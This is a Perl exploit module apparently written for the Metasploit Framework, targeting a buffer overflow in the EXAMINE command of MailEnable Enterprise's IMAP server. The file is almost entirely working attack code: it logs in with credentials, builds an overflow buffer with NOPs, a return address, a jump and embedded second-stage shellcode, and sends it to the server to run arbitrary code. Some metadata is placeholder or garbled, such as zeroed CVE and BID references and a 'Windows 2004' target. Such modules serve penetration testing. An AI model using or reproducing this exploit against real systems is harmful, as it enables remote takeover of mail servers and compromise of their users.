
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::muts_mailenable_imap_examine;
use strict;
use base 'Msf::Exploit';
use Msf::Socket::Tcp;
use Pex::Text;


my $advanced = {
  };

my $info = {
	'Name'    => 'MailEnable ENTERPRISE IMAP EXAMINE Request Buffer Overflow',
	'Version'  => '$Revision: 1.0 $',
	'Authors' => [ 'mati@see-security.com' ],
	'Arch'    => [ 'x86' ],
	'OS'      => [ 'win32', 'win2000'],
	'Priv'    => 1,

	'UserOpts'  =>
	  {
		'RHOST' => [1, 'ADDR', 'The target address'],
		'RPORT' => [1, 'PORT', 'The target port', 143],
		'USER'  => [1, 'DATA', 'IMAP Username'],
		'PASS'  => [1, 'DATA', 'IMAP Password'],
	  },

	'AutoOpts'  => { 'EXITFUNC'  => 'thread' },
	'Payload' =>
	  {
		'Space'     => 1021,
		'BadChars'  => "\x00\x0a\x0d\x20\x22",
                'MinNops'   => 0,
                'MaxNops'   => 0,
		'Keys'      => ['+ws2ord'],
	  },

	'Description'  => Pex::Text::Freeform(qq{
MailEnable's IMAP server contains a buffer overflow vulnerability
in the EXAMINE command. With proper credentials, this could allow
for the execution of arbitrary code. 
}),

	'Refs'  =>
	  [
		['CVE','0000'],
		['BID', '0000' ],
		['NSS', '0000' ],
	  ],

	'Targets' =>
	  [
		['Windows 2004 SP4 Server English', 1021, 0x7c4e4a66 ], 
	  ],

	'Keys' => ['imap'],

	'DisclosureDate' => 'Dec 19 2005',
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({'Info' => $info, 'Advanced' => $advanced}, @_);

	return($self);
}

sub Exploit {
	my $self = shift;
	my $targetHost  = $self->GetVar('RHOST');
	my $targetPort  = $self->GetVar('RPORT');
	my $targetIndex = $self->GetVar('TARGET');
	my $user        = $self->GetVar('USER');
	my $pass        = $self->GetVar('PASS');
	my $encodedPayload = $self->GetVar('EncodedPayload');
	my $shellcode   = $encodedPayload->Payload;
	my $target = $self->Targets->[$targetIndex];

	my $sock = Msf::Socket::Tcp->new(
		'PeerAddr' => $targetHost,
		'PeerPort' => $targetPort,
	  );
	  
	if($sock->IsError) {
		$self->PrintLine('Error creating socket: ' . $sock->GetError);
		return;
	}

	my $resp = $sock->Recv(-1, 3);
	chomp($resp);
	$self->PrintLine('[*] Got Banner: ' . $resp);
	my $sploit = "A001 LOGIN $user $pass";
	$sock->Send($sploit . "\r\n");
	my $resp = $sock->Recv(-1, 4);
	if($sock->IsError) {
		$self->PrintLine('Socket error: ' . $sock->GetError);
		return;
	}
	
	if($resp !~ /^A001 OK/) {
		$self->PrintLine('Login error: ' . $resp);
		return;
	}
	
	$self->PrintLine('[*] Logged in, sending overflow...');

# Using Msf::Encoder::PexFnstenvMov with final size of 42 bytes

my $secondshellcode = "\x6a\x05\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x16\x91\x9c".
"\x30\x83\xeb\xfc\xe2\xf4\xcf\x7f\x45\x44\x32\x65\xc5\xb0\xd7\x9b".
"\x0c\xce\xdb\x6f\x51\xcf\xf7\x91\x9c\x30";

my $login = "A001 EXAMINE ";
my $buffer = $self->MakeNops(1021);
substr($buffer, 532, length($shellcode), $shellcode);
substr($buffer, 961, 4, "\xeb\x06\x06\xeb");
substr($buffer, 965, 4, "\x66\x4a\x4e\x7c"); # jmp ebx win200 sp4
substr($buffer, 979, 42, $secondshellcode);
print "[*] Shellcode Length : " . length($shellcode) . "\n";
my $finalbuffer = $login . $buffer;
$sock->Send($finalbuffer . "\r\n");
my $resp = $sock->Recv(-1, 4);
if(length($resp)) {
	$self->PrintLine('[*] Got response, bad: ' . $resp);
	}
	
	return;
}

1;
